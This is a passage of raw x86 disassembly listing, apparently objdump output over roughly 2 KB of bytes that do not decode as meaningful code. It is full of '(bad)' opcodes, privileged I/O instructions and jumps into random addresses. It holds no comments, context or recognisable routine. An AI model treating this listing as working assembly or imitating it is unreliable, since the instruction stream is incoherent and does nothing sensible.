  407db3:	(bad)  
  407db4:	and    dl,bl
  407db6:	not    bl
  407db8:	xchg   esi,eax
  407db9:	push   esp
  407dba:	mov    edi,0xd6426e08
  407dbf:	mov    edi,0xdaa20906
  407dc4:	push   es
  407dc5:	les    eax,FWORD PTR [edi]
  407dc7:	xchg   edi,eax
  407dc8:	lods   eax,DWORD PTR ds:[esi]
  407dc9:	mov    al,ds:0x94f9ad25
  407dce:	push   ds
  407dcf:	jg     0x407d52
  407dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd3:	nop
  407dd4:	enter  0xeb2d,0x32
  407dd8:	xor    dl,BYTE PTR [ecx+0x191544c2]
  407dde:	addr16 loopne 0x407e49
  407de1:	inc    esi
  407de2:	xor    al,0xb5
  407de4:	and    al,0x9f
  407de6:	pop    esp
  407de7:	adc    edx,DWORD PTR [ecx]
  407de9:	jne    0x407dd9
  407deb:	adc    al,0x8b
  407ded:	loope  0x407dae
  407def:	int3   
  407df0:	mov    gs,eax
  407df2:	sub    BYTE PTR [edi+0x1f],ch
  407df5:	in     al,0x42
  407df7:	stos   DWORD PTR es:[edi],eax
  407df8:	jecxz  0x407da5
  407dfa:	push   edi
  407dfb:	xor    BYTE PTR [eax],bl
  407dfd:	sub    DWORD PTR [edx+0x472c1814],eax
  407e03:	xor    al,0x41
  407e05:	scas   eax,DWORD PTR es:[edi]
  407e06:	pop    ebx
  407e07:	pop    esi
  407e08:	imul   eax,ebx,0xda0b0f18
  407e0e:	push   0xffffffdc
  407e10:	adc    eax,DWORD PTR [edx]
  407e12:	outs   dx,BYTE PTR ds:[esi]
  407e13:	cmove  ebp,DWORD PTR [edi+0x493f9e17]
  407e1a:	vandnps xmm7,xmm6,xmm0
  407e1e:	inc    DWORD PTR [edi]
  407e20:	call   0x74e36b7c
  407e25:	lods   eax,DWORD PTR ds:[esi]
  407e26:	xchg   edi,esp
  407e28:	sbb    BYTE PTR [ecx+0x56],bh
  407e2b:	cmp    cl,BYTE PTR [edi+0x3d7e045f]
  407e31:	jb     0x407ea6
  407e33:	shl    DWORD PTR [ebp+0x73bbae48],0xa6
  407e3a:	das    
  407e3b:	nop
  407e3c:	ins    BYTE PTR es:[edi],dx
  407e3d:	push   esp
  407e3e:	cld    
  407e3f:	ja     0x407dc1
  407e41:	sbb    eax,0x9073062d
  407e46:	aaa    
  407e47:	shl    ebx,0x12
  407e4a:	les    ebx,FWORD PTR [esi]
  407e4c:	push   eax
  407e4d:	xchg   esp,eax
  407e4e:	arpl   WORD PTR [edx],bp
  407e50:	outs   dx,BYTE PTR ds:[esi]
  407e51:	enter  0x4fa5,0xb
  407e55:	sbb    BYTE PTR [ecx],bh
  407e57:	add    al,0x1b
  407e59:	fwait
  407e5a:	imul   eax,DWORD PTR [ecx-0x58],0xa4e03318
  407e61:	(bad)  
  407e62:	pushf  
  407e63:	in     eax,0x10
  407e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e66:	fimul  WORD PTR [ecx+0x45c29d74]
  407e6c:	pop    ds
  407e6d:	mov    ah,0xac
  407e6f:	push   eax
  407e70:	ss gs fwait
  407e73:	or     esp,DWORD PTR [ebp-0x3c]
  407e76:	inc    edx
  407e77:	dec    ecx
  407e78:	rcl    ch,0xb3
  407e7b:	(bad)  
  407e7c:	xlat   BYTE PTR ds:[ebx]
  407e7d:	sti    
  407e7e:	add    DWORD PTR [ecx-0x6ec7f978],esi
  407e84:	dec    esi
  407e85:	jo     0x407e15
  407e87:	lahf   
  407e88:	adc    ecx,ecx
  407e8a:	xor    bl,BYTE PTR [ecx-0x7c651b9]
  407e90:	(bad)  
  407e91:	dec    ecx
  407e92:	sub    BYTE PTR [ebp-0x1d1862a6],dl
  407e98:	dec    ebx
  407e99:	out    dx,eax
  407e9a:	(bad)  
  407e9b:	pop    ecx
  407e9c:	cdq    
  407e9d:	lahf   
  407e9e:	enter  0x59af,0x94
  407ea2:	fiadd  DWORD PTR [ebp-0x56]
  407ea5:	hlt    
  407ea6:	xchg   ebp,eax
  407ea7:	pop    DWORD PTR [edi+0x50]
  407eaa:	(bad)  
  407eab:	imul   eax,DWORD PTR [eax],0xc2a71e11
  407eb1:	das    
  407eb2:	lods   al,BYTE PTR ds:[esi]
  407eb3:	nop
  407eb4:	pop    ecx
  407eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eb6:	pop    ebx
  407eb7:	or     edi,DWORD PTR [edi+0x4c]
  407eba:	mov    edx,0xd524aafa
  407ebf:	pop    ds
  407ec0:	mov    ch,0xfd
  407ec2:	ins    BYTE PTR es:[edi],dx
  407ec3:	and    al,0xce
  407ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec6:	add    BYTE PTR [ecx+0x5f],bl
  407ec9:	pop    edi
  407eca:	ret    0x3dff
  407ecd:	sub    eax,0x988bbf07
  407ed2:	ret    0x7dda
  407ed5:	outs   dx,DWORD PTR ds:[esi]
  407ed6:	rcr    BYTE PTR [esi+0x48],0x75
  407eda:	or     al,0xf2
  407edc:	call   0x5839fc68
  407ee1:	fwait
  407ee2:	jns    0x407e68
  407ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee5:	out    0x9,eax
  407ee7:	jnp    0x407ef4
  407ee9:	imul   ecx,DWORD PTR [esi-0x5c1841bb],0xffffffe2
  407ef0:	rol    bh,cl
  407ef2:	icebp  
  407ef3:	push   eax
  407ef4:	mov    DWORD PTR [esi+0x5],ecx
  407ef7:	pop    edx
  407ef8:	arpl   WORD PTR [ecx+eax*1-0x20],cx
  407efc:	shl    BYTE PTR [edi+0x238b84d9],cl
  407f02:	ret    0xe9cd
  407f05:	push   eax
  407f06:	xor    BYTE PTR [ebp-0x78e8f713],0xc5
  407f0d:	cmp    ch,BYTE PTR [esi+0x56]
  407f10:	ja     0x407edd
  407f12:	jl     0x407ed6
  407f14:	jo     0x407eba
  407f16:	inc    ebx
  407f17:	popa   
  407f18:	imul   esp,DWORD PTR [edx-0x10],0xfffffff4
  407f1c:	or     DWORD PTR [eax-0x52],edx
  407f1f:	test   BYTE PTR [ecx-0x281f1581],bh
  407f25:	xchg   esp,eax
  407f26:	pop    ds
  407f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f28:	leave  
  407f29:	mov    eax,ds:0x42f74bbd
  407f2e:	clc    
  407f2f:	xchg   ecx,eax
  407f30:	pop    eax
  407f31:	imul   edx,DWORD PTR [esi-0x3a0a8938],0xffffff9f
  407f38:	xor    DWORD PTR [edi-0x106bd4a5],edx
  407f3e:	mov    BYTE PTR [esi],bl
  407f40:	jnp    0x407f45
  407f42:	pop    es
  407f43:	pop    esi
  407f44:	push   cs
  407f45:	mov    eax,ds:0x9a37cf8c
  407f4a:	cmp    ah,BYTE PTR [esi+0x67]
  407f4d:	pop    esp
  407f4e:	retf   0x7113
  407f51:	add    al,BYTE PTR [edi]
  407f53:	int    0x1a
  407f55:	xchg   ecx,eax
  407f56:	lea    eax,[ebx]
  407f58:	outs   dx,DWORD PTR ds:[esi]
  407f59:	and    ah,ch
  407f5b:	cmc    
  407f5c:	cs jl  0x407f14
  407f5f:	add    eax,0x2d5b64e7
  407f64:	mov    dl,0x6
  407f66:	jmp    0x407f1d
  407f68:	and    eax,DWORD PTR ds:0x5084116c
  407f6e:	pop    ds
  407f6f:	push   ebx
  407f70:	push   eax
  407f71:	jg     0x407f8e
  407f73:	xchg   edi,eax
  407f74:	cmp    dh,BYTE PTR [eax+0x15]
  407f77:	shl    BYTE PTR [ebx+0x2a],0x75
  407f7b:	sbb    ebx,edx
  407f7d:	stc    
  407f7e:	add    bl,ah
  407f80:	inc    edx
  407f81:	js     0x407f48
  407f83:	xchg   esp,eax
  407f84:	adc    DWORD PTR [ecx],esp
  407f86:	jno    0x407f53
  407f88:	adc    al,0xf4
  407f8a:	int3   
  407f8b:	add    esi,DWORD PTR [eax+0x493f7b0f]
  407f91:	pop    edx
  407f92:	xlat   BYTE PTR ds:[ebx]
  407f93:	push   es
  407f94:	mov    dh,0xb1
  407f96:	or     eax,0x9e578689
  407f9b:	add    al,0x8
  407f9d:	addr16 cmp al,0xe4
  407fa0:	jmp    DWORD PTR [esi]
  407fa2:	and    DWORD PTR ss:[esi],eax
  407fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa6:	jnp    0x407fd5
  407fa8:	push   ss
  407fa9:	jbe    0x407fdd
  407fab:	sbb    eax,DWORD PTR [eax+0x657eb4b2]
  407fb1:	and    edx,0xd23df907
  407fb7:	push   esp
  407fb8:	pop    ebp
  407fb9:	push   ebx
  407fba:	add    esi,DWORD PTR [eax]
  407fbc:	jne    0x407f5d
  407fbe:	adc    DWORD PTR [edx-0x42],ecx
  407fc1:	sti    
  407fc2:	aam    0x9e
  407fc4:	fisubr DWORD PTR [eax-0x361a3508]
  407fca:	sar    BYTE PTR [ebx-0x58],0x23
  407fce:	scas   al,BYTE PTR es:[edi]
  407fcf:	fimul  DWORD PTR [eax+0x585d8495]
  407fd5:	cmp    eax,0x719be478
  407fda:	mov    ds:0x53822b6b,eax
  407fdf:	jb     0x407f97
  407fe1:	je     0x40803c
  407fe3:	ja     0x407fca
  407fe5:	mov    ds,WORD PTR ds:0x7a69c139
  407feb:	ja     0x40804b
  407fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fee:	enter  0x3bc7,0xd7
  407ff2:	dec    ebx
  407ff3:	and    BYTE PTR [edx-0x69],bl
  407ff6:	std    
  407ff7:	push   esp
  407ff8:	push   cs
  407ff9:	and    al,0xd3
  407ffb:	pop    es
  407ffc:	shl    dh,cl
  407ffe:	xchg   ebp,eax
  407fff:	loope  0x408078
  408001:	inc    edx
  408002:	push   cs
  408003:	mov    cl,BYTE PTR [edx-0x124b2abe]
  408009:	pop    ebp
  40800a:	das    
  40800b:	sbb    dl,BYTE PTR [ebx+0x75990922]
  408011:	jg     0x40806f
  408013:	dec    ecx
  408014:	lahf   
  408015:	pop    edx
  408016:	mov    esp,0x57536613
  40801b:	ins    BYTE PTR es:[edi],dx
  40801c:	jl     0x40800f
  40801e:	xor    eax,0xe25316ff
  408023:	stos   DWORD PTR es:[edi],eax
  408024:	fwait
  408025:	div    eax
  408027:	pop    edi
  408028:	push   es
  408029:	sahf   
  40802a:	(bad)  
  40802c:	fisubr WORD PTR [ebx+0x61]
  40802f:	aad    0xfc
  408031:	and    al,0xd1
  408033:	out    0x27,al
  408035:	jnp    0x408073
  408037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408038:	(bad)  ss:[eax-0x25206373]
  40803f:	in     al,dx
  408040:	test   eax,0xf91034da
  408045:	leave  
  408046:	push   esi
  408047:	push   eax
  408048:	loop   0x408005
  40804a:	cs jge 0x408007
  40804d:	adc    al,0xcc
  40804f:	push   es
  408050:	xor    eax,0xac3e5291
  408055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408056:	imul   bp,WORD PTR ds:0x28637552,0xa3a6
  40805f:	test   BYTE PTR [ecx+0x1],0x77
  408063:	xchg   DWORD PTR [ecx-0x2c35fc2a],esi
  408069:	call   0x4ab06703
  40806e:	mov    cl,0xfd
  408070:	lods   al,BYTE PTR ds:[esi]
  408071:	dec    ebp
  408072:	stc    
  408073:	retf   
  408074:	push   eax
  408075:	or     al,0xf2
  408077:	mov    dl,0xde
  408079:	adc    al,0x37
  40807b:	mov    al,ds:0x366b336f
  408080:	sbb    BYTE PTR [ecx],ah
  408082:	int    0xf5
  408084:	or     eax,0x367fe6cc
  408089:	fs push esi
  40808b:	sub    BYTE PTR [edi-0x1c986766],al
  408091:	xchg   edi,eax
  408092:	faddp  st(2),st
  408094:	rcl    edi,cl
  408096:	mov    cl,0x5
  408098:	inc    edi
  408099:	mov    ds,WORD PTR [edi]
  40809b:	iret   
  40809c:	mov    ds:0x11f9d2fd,eax
  4080a1:	ja     0x40802e
  4080a3:	push   es
  4080a4:	pop    ebx
  4080a5:	sbb    al,0x97
  4080a7:	int    0xb8
  4080a9:	clc    
  4080aa:	scas   al,BYTE PTR es:[edi]
  4080ab:	int    0x4a
  4080ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ae:	stc    
  4080af:	jns    0x408122
  4080b1:	mov    ecx,esi
  4080b3:	mov    ebp,0xdd28c26c
  4080b8:	jl     0x40806f
  4080ba:	xor    bl,BYTE PTR [edx+0x440af87]
  4080c0:	pop    esp
  4080c1:	jg     0x408123
  4080c3:	add    eax,0xf3215a7f
  4080c8:	retf   
  4080c9:	mov    ebp,esp
  4080cb:	inc    edi
  4080cc:	lds    ebp,FWORD PTR [edi]
  4080ce:	cmp    DWORD PTR [esi+ebx*1-0xa],edi
  4080d2:	xchg   ebp,eax
  4080d3:	int3   
  4080d4:	lea    esi,[ebp+ebx*4-0x2a]
  4080d8:	or     DWORD PTR [esi-0x59],edi
  4080db:	in     eax,0x40
  4080dd:	fist   WORD PTR [esi+edx*1+0x7b]
  4080e1:	add    ebx,DWORD PTR fs:[ebp-0xefee3b6]
  4080e8:	sub    dl,BYTE PTR [edx+ebx*8-0x35]
  4080ec:	sbb    esp,DWORD PTR [eax]
  4080ee:	and    al,0x5f
  4080f0:	(bad)
  4080f3:	sbb    bh,BYTE PTR fs:[edi-0x3f48b59d]
  4080fa:	hlt    
  4080fb:	xor    al,al
  4080fd:	jno    0x408135
  4080ff:	xchg   esp,eax
  408100:	mov    esi,0xe5953e11
  408105:	add    DWORD PTR [edi],ebx
  408107:	cmc    
  408108:	push   eax
  408109:	and    bh,BYTE PTR [edi+0x3b]
  40810c:	mov    al,0x9
  40810e:	dec    esi
  40810f:	leave  
  408110:	adc    ah,dl
  408112:	push   ebp
  408113:	pushf  
  408114:	mov    dh,0xf
  408116:	dec    eax
  408117:	mov    bh,0x8
  408119:	or     esi,edx
  40811b:	push   es
  40811c:	mov    ds:0xd94fc183,eax
  408121:	leave  
  408122:	mov    ch,0x33
  408124:	push   esi
  408125:	sbb    eax,0x2fa54413
  40812a:	jp     0x40816d
  40812c:	arpl   WORD PTR [esi-0x17523b1d],di
  408132:	lea    eax,[ebp+0x2cce9b1f]
  408138:	(bad)  
  408139:	and    DWORD PTR [eax+0x47],esi
  40813c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40813d:	cmp    esi,DWORD PTR [esi+0x3a1c0a29]
  408143:	js     0x40815c
  408145:	fwait
  408146:	fs push 0xffffff90
  408149:	fs jle 0x408187
  40814c:	and    BYTE PTR [eax-0x43a3934c],ah
  408152:	loopne 0x408148
  408154:	dec    ecx
  408155:	mov    ecx,0xb2b6cb6e
  40815a:	xchg   esp,eax
  40815b:	sub    DWORD PTR [esi],esp
  40815d:	fisttp DWORD PTR [di]
  408160:	scas   al,BYTE PTR es:[edi]
  408161:	ss stos BYTE PTR es:[edi],al
  408163:	mov    ebx,0x30d2ab6
  408168:	cmp    BYTE PTR [eax+0x6c3a7eb9],dl
  40816e:	inc    esi
  40816f:	jnp    0x408141
  408171:	push   ss
  408172:	dec    edx
  408173:	push   ds
  408174:	xchg   ebp,eax
  408175:	popf   
  408176:	or     edx,0xe9d92afe
  40817c:	sti    
  40817d:	stos   DWORD PTR es:[edi],eax
  40817e:	popf   
  40817f:	fidiv  DWORD PTR [edi+0x70c1f75a]
  408185:	stc    
  408186:	cli    
  408187:	jae    0x408165
  408189:	imul   eax,ebx,0x52edaeb5
  40818f:	inc    ebx
  408190:	or     DWORD PTR [ebp-0x11],esp
  408193:	(bad)  
  408194:	out    dx,al
  408195:	aaa    
  408196:	sahf   
  408197:	push   esp
  408198:	and    al,BYTE PTR [edi-0x4627e95f]
  40819e:	add    ecx,DWORD PTR ds:0x615e710b
  4081a4:	fcomp  DWORD PTR [esi]
  4081a6:	or     eax,0x84741238
  4081ab:	popa   
  4081ac:	push   ds
  4081ad:	xchg   esi,eax
  4081ae:	icebp  
  4081af:	pop    edi
  4081b0:	add    bh,0x8
  4081b3:	aam    0x44
  4081b5:	bound  ebp,QWORD PTR [ecx+0x4b0b4627]
  4081bb:	into   
  4081bc:	and    DWORD PTR [edi],0x45
  4081bf:	mov    ecx,0xf670cdbc
  4081c4:	dec    ebp
  4081c5:	int    0x87
  4081c7:	push   cs
  4081c8:	in     al,0x91
  4081ca:	(bad)  
  4081cb:	mov    BYTE PTR [edx-0x2c1dfd35],dh
  4081d1:	dec    esp
  4081d2:	push   ebp
  4081d3:	sbb    al,0xf5
  4081d6:	stos   DWORD PTR es:[edi],eax
  4081d7:	push   esi
  4081d8:	stos   BYTE PTR es:[edi],al
  4081d9:	fwait
  4081da:	mov    dl,0x5a
  4081dc:	jno    0x40816e
  4081de:	mov    edx,DWORD PTR [ebp+0x1e1710]
  4081e4:	sub    BYTE PTR [eax-0x6de13176],ah
  4081ea:	xchg   ebx,eax
  4081eb:	neg    dl
  4081ed:	add    esi,ecx
  4081ef:	sbb    BYTE PTR [esi+0x18],ah
  4081f2:	test   al,0x4e
  4081f4:	sbb    esi,edi
  4081f6:	out    dx,eax
  4081f7:	inc    ebx
  4081f8:	inc    ebx
  4081f9:	shl    BYTE PTR [ebx],1
  4081fb:	add    al,BYTE PTR [esi-0x34052948]
  408201:	stos   DWORD PTR es:[edi],eax
  408202:	pop    ebx
  408203:	and    BYTE PTR [edx],dl
  408205:	into   
  408206:	lods   al,BYTE PTR ds:[esi]
  408207:	imul   BYTE PTR [edx+eiz*2+0x5f5c6ce7]
  40820e:	loope  0x408207
  408210:	test   DWORD PTR [eax+0x3],esi
  408213:	int3   
  408214:	test   eax,0xbdf9013e
  408219:	dec    ecx
  40821a:	mov    bl,dl
  40821c:	int    0x20
  40821e:	aas    
  40821f:	icebp  
  408220:	sbb    edi,DWORD PTR [ecx+0x1005dd5f]
  408226:	sbb    ebp,DWORD PTR [ecx-0x1f79a0e7]
  40822c:	mov    ah,0x99
  40822e:	dec    edi
  40822f:	mov    cl,0xa5
  408231:	rcl    DWORD PTR [ecx-0x1c665596],1
  408237:	mov    gs,WORD PTR [edx-0x23a65ab1]
  40823d:	test   BYTE PTR [ecx-0x35],dl
  408240:	je     0x4081f6
  408242:	pusha  
  408243:	push   esi
  408244:	es in  al,dx
  408246:	(bad)  
  408247:	fadd   st,st(4)
  408249:	lsl    esi,cx
  40824c:	std    
  40824d:	(bad)  
  40824e:	and    cl,dh
  408250:	bnd jnp 0x408211
  408253:	mov    dl,0x46
  408255:	gs aas 
  408257:	push   ebp
  408258:	sub    al,0x1c
  40825a:	mov    edi,0x261beecb
  40825f:	mov    edx,ds
  408261:	icebp  
  408262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408263:	dec    esi
  408264:	stos   DWORD PTR es:[edi],eax
  408265:	push   esi
  408266:	push   ds
  408267:	addr16 push edi
  408269:	ins    DWORD PTR es:[edi],dx
  40826a:	or     DWORD PTR [ecx],0xffffff8f
  40826d:	int    0x41
  40826f:	xlat   BYTE PTR ds:[ebx]
  408270:	push   es
  408271:	fidiv  DWORD PTR [edx+0x23427c0c]
  408277:	xor    eax,DWORD PTR [ecx-0x68]
  40827a:	in     al,0x61
  40827c:	hlt    
  40827d:	jl     0x4081ff
  40827f:	ret    0x150b
  408282:	xchg   BYTE PTR [ecx+0x75715916],dh
  408288:	pop    es
  408289:	aas    
  40828a:	xor    al,0x66
  40828c:	enter  0x3bf,0xd6
  408290:	mov    ch,0x25
  408292:	mov    eax,0x7a41d55c
  408297:	sub    eax,0x2a6e23a2
  40829c:	mov    bl,BYTE PTR [eax+edi*4]
  40829f:	jecxz  0x408237
  4082a1:	shl    BYTE PTR [ebx+0x67],cl
  4082a4:	inc    edi
  4082a5:	push   cs
  4082a6:	cmp    DWORD PTR [esi],ebp
  4082a8:	sbb    bh,BYTE PTR [edi+edi*2]
  4082ab:	cmp    bh,BYTE PTR [esi+eax*2+0x7a0c2e62]
  4082b2:	xor    edx,esp
  4082b4:	mov    ds:0xfccb5d5e,eax
  4082b9:	dec    esi
  4082ba:	(bad)  
  4082bb:	out    0x42,eax
  4082bd:	mov    bh,0xe1
  4082bf:	mov    DWORD PTR [ebp+0x24],ebp
  4082c2:	mov    ebx,0x7ac7fea0
  4082c7:	xor    eax,0x899cbde1
  4082cc:	repz push edx
  4082ce:	jne    0x40827b
  4082d0:	add    cl,ah
  4082d2:	cli    
  4082d3:	jae    0x4082d3
  4082d5:	mov    ebx,0x1c5c245d
  4082da:	cwde   
  4082db:	sub    DWORD PTR ds:0x48397665,0xe172941
  4082e5:	or     ecx,esp
  4082e7:	in     eax,dx
  4082e8:	dec    edi
  4082e9:	add    eax,0x75a0b88b
  4082ee:	xor    al,0x50
  4082f0:	xchg   esi,eax
  4082f1:	call   0x5d87:0x5610c226
  4082f8:	gs jl  0x408312
  4082fb:	xchg   ebx,eax
  4082fc:	stc    
  4082fd:	ret    0x67d2
  408300:	fstp   QWORD PTR [eax-0x48911baa]
  408306:	test   ah,ch
  408308:	xlat   BYTE PTR ds:[ebx]
  408309:	gs out dx,al
  40830b:	adc    DWORD PTR [ebx-0x64],edx
  40830e:	and    ch,BYTE PTR ds:0xcfdaac4b
  408314:	inc    ebp
  408315:	xchg   ebx,eax
  408316:	jmp    FWORD PTR [eax]
  408318:	iret   
  408319:	add    BYTE PTR [ebx+0x41a92408],ch
  40831f:	jecxz  0x40830f
  408321:	sbb    bl,BYTE PTR [edx+0x16a7f2db]
  408327:	xor    ah,bl
  408329:	pop    eax
  40832a:	dec    ebx
  40832b:	jmp    0x804a:0x14d564de
  408332:	shr    ebp,cl
  408334:	mov    eax,eax
  408336:	cwde   
  408337:	ja     0x40838d
  408339:	(bad)  
  40833a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40833b:	sub    BYTE PTR ds:[ecx+ebp*4-0x78],ah
  408340:	(bad)  
  408341:	fnop   
  408343:	push   esp
  408344:	fwait
  408345:	xchg   ebx,eax
  408346:	jae    0x4083b8
  408348:	mov    bh,0xdc
  40834a:	shl    BYTE PTR [ebp+0x70ef8eb3],cl
  408350:	mul    edx
  408352:	popf   
  408353:	(bad)  
  408355:	xor    ah,ah
  408357:	iret   
  408358:	or     al,0x42
  40835a:	call   0xb20d:0xcede1c66
  408361:	daa    
  408362:	jmp    0x274:0x2ed0a5e5
  408369:	hlt    
  40836a:	lods   al,BYTE PTR ds:[esi]
  40836b:	rcl    BYTE PTR [eax],1
  40836d:	not    edx
  40836f:	fdiv   st(1),st
  408371:	lods   eax,DWORD PTR ds:[esi]
  408372:	pusha  
  408373:	imul   al
  408375:	mov    ds:0x5e49a607,eax
  40837a:	and    BYTE PTR [ebx],0xad
  40837d:	shl    BYTE PTR [ecx],0x90
  408380:	(bad)  
  408381:	jmp    0x4083b4
  408383:	jl     0x408383
  408385:	pop    ds
  408386:	add    al,BYTE PTR [esi+0x33]
  408389:	fadd   DWORD PTR ds:0x884af0fe
  40838f:	pop    ebx
  408390:	retf   0xc7aa
  408393:	clc    
  408394:	push   0x7b
  408396:	leave  
  408397:	test   edx,ecx
  408399:	dec    ebx
  40839a:	loope  0x40835c
  40839c:	sbb    DWORD PTR [eax],ebp
  40839e:	pop    edx
  40839f:	xchg   esp,eax
  4083a0:	retf   0x6c71
  4083a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a4:	inc    esi
  4083a5:	and    eax,DWORD PTR [eax+eiz*8+0x7]
  4083a9:	leave  
  4083aa:	fdivr  DWORD PTR [edx]
  4083ac:	std    
  4083ad:	jnp    0x40838b
  4083af:	add    eax,0xd3effcb
  4083b4:	idiv   ebx
  4083b6:	push   ds
  4083b7:	clc    
  4083b8:	pop    esp
  4083b9:	mov    esi,0x3b9b409b
  4083be:	sti    
  4083bf:	mov    ax,0xf70f
  4083c3:	pop    ebx
  4083c4:	jae    0x40835e
  4083c6:	sahf   
  4083c7:	bound  ebx,QWORD PTR [ebx+0x46]
  4083ca:	sahf   
  4083cb:	scas   eax,DWORD PTR es:[edi]
  4083cc:	add    DWORD PTR [edi],eax
  4083ce:	icebp  
  4083cf:	fsub   QWORD PTR ds:0xc92d598a
  4083d5:	scas   eax,DWORD PTR es:[edi]
  4083d6:	xchg   ecx,eax
  4083d7:	(bad)  
  4083d8:	rcr    BYTE PTR [esi+0x7a],0x9a
  4083dc:	loopne 0x408421
  4083de:	ss push ebp
  4083e0:	mov    es,WORD PTR [ecx+ecx*2]
  4083e3:	popa   
  4083e4:	sbb    ah,BYTE PTR [ebx+0x78]
  4083e7:	cmp    BYTE PTR [ebx+0x276b7bc3],0xa8
  4083ee:	je     0x408372
  4083f0:	sbb    eax,0x864d38d0
  4083f5:	popa   
  4083f6:	ins    BYTE PTR es:[edi],dx
  4083f7:	std    
  4083f8:	pop    ebp
  4083f9:	cmp    DWORD PTR [esi-0xa],ecx
  4083fc:	test   al,0x9f
  4083fe:	es mov ebx,0x209546a6
  408404:	retf   
  408405:	sub    al,0x46
  408407:	pop    ebp
  408408:	xlat   BYTE PTR ds:[ebx]
  408409:	cmc    
  40840a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40840b:	aad    0x20
  40840d:	add    eax,0xb9f57642
  408412:	and    DWORD PTR [edx-0x69],esp
  408415:	mov    gs,WORD PTR [ebx+0x39]
  408418:	sub    ebx,edx
  40841a:	iret   
  40841b:	jle    0x4083ab
  40841d:	mov    dh,0x7f
  40841f:	pop    edi
  408420:	cmp    edx,DWORD PTR [edx]
  408422:	fwait
  408423:	xor    al,0x12
  408425:	sbb    BYTE PTR [esi-0x18dd34f1],ch
  40842b:	in     al,0xf8
  40842d:	and    dh,0x91
  408430:	or     BYTE PTR [esi-0x5a],cl
  408433:	mov    eax,ds:0xadc1983b
  408438:	push   esi
  408439:	adc    DWORD PTR [ebx-0x4e],ebx
  40843c:	push   ss
  40843d:	dec    edi
  40843e:	xor    eax,0xb409f1c0
  408443:	mov    esi,0x3135a91
  408448:	sub    DWORD PTR [esp+ebp*8+0x57844dc8],eax
  40844f:	jo     0x408471
  408451:	ret    
  408452:	mov    bl,0xa
  408454:	pop    ss
  408455:	lods   al,BYTE PTR ds:[esi]
  408456:	mov    DWORD PTR [ebp-0x77],edi
  408459:	ds push esp
  40845b:	scas   eax,DWORD PTR es:[edi]
  40845c:	(bad)  
  40845d:	jg     0x408463
  40845f:	and    DWORD PTR [esp+edx*8-0x2a65221d],ebx
  408466:	push   esi
  408467:	pushf  
  408468:	jnp    0x4084ca
  40846a:	xchg   ecx,eax
  40846b:	(bad)  
  40846c:	sub    eax,0x3ee48878
  408471:	imul   esp,DWORD PTR [eax],0xffffffc6
  408474:	pop    ebx
  408475:	out    dx,al
  408476:	push   es
  408477:	cmp    DWORD PTR [eax-0x5b],eax
  40847a:	aas    
  40847b:	xor    esi,DWORD PTR [edi+0x4b]
  40847e:	out    0x12,al
  408480:	mov    DWORD PTR [ebp+0x4d],0xbc2b27e4
  408487:	ins    DWORD PTR es:[edi],dx
  408488:	in     eax,dx
  408489:	jo     0x4084a5
  40848b:	sbb    al,0x78
  40848d:	rcr    BYTE PTR [ecx-0x7],1
  408490:	lods   eax,DWORD PTR ds:[esi]
  408491:	stc    
  408492:	pop    eax
  408493:	inc    edi
  408494:	adc    al,0x76
  408496:	or     dl,al
  408498:	jmp    0x547a:0x85fdae65
  40849f:	push   esp
  4084a0:	cmp    DWORD PTR [ebx-0x670e2879],esi
  4084a6:	retf   
  4084a7:	popf   
  4084a8:	das    
  4084a9:	mov    ds:0xc138e456,eax
  4084ae:	xchg   ebp,eax
  4084af:	jo     0x4084df
  4084b1:	icebp  
  4084b2:	mov    ecx,0xd0cbc629
  4084b7:	daa    
  4084b8:	mov    dh,ah
  4084ba:	xchg   esi,eax
  4084bb:	mov    eax,ds:0xe7abc8a3
  4084c0:	dec    eax
  4084c1:	jo     0x40845c
  4084c3:	or     DWORD PTR [esi+0xb],ebp
  4084c6:	aam    0xfe
  4084c8:	leave  
  4084c9:	pusha  
  4084ca:	xor    DWORD PTR [ecx-0x534024ca],edx
  4084d0:	lods   eax,DWORD PTR ds:[esi]
  4084d1:	enter  0x5057,0x1c
  4084d5:	cdq    
  4084d6:	leave  
  4084d7:	stc    
  4084d8:	(bad)  
  4084d9:	lahf   
  4084da:	xchg   ebp,eax
  4084db:	clc    
  4084dc:	dec    edi
  4084dd:	nop
  4084de:	or     cl,BYTE PTR [ebx+eiz*1]
  4084e1:	and    ebp,DWORD PTR [ebx+0x1d62ddd7]
  4084e7:	mov    esp,DWORD PTR [esi]
  4084e9:	imul   eax,edx,0x1e88614a
  4084ef:	(bad)
  4084f4:	xor    DWORD PTR [edi],ecx
  4084f6:	cmp    BYTE PTR [edi+eax*2-0x1ccb44ee],bh
  4084fd:	out    dx,eax
  4084fe:	xor    eax,0x2961e427
  408503:	xor    BYTE PTR ds:0xa51d083f,ch
  408509:	popf   
  40850a:	imul   esp,DWORD PTR [ebp+0xa],0xffffff90
  40850e:	fdiv   st(6),st
  408510:	faddp  st(1),st
  408512:	xor    BYTE PTR [edi],al
  408514:	les    eax,FWORD PTR [edx]
  408516:	mov    eax,0x94e62915
  40851b:	call   0xa842d354
  408520:	aas    
  408521:	mov    ds,WORD PTR [edi-0x6]
  408524:	sub    al,0xd
  408526:	lahf   
  408527:	xor    BYTE PTR [ecx],0xac
  40852a:	aas    
  40852b:	xchg   esp,eax
  40852c:	jmp    0x4084c3
  40852e:	inc    esi
  40852f:	push   edx
  408530:	jb     0x40856f
  408532:	nop
  408533:	cli    
  408534:	dec    edx
  408535:	pop    ebp
  408536:	add    ebp,DWORD PTR [edi+0x29]
  408539:	adc    DWORD PTR [edi-0x27],ebx
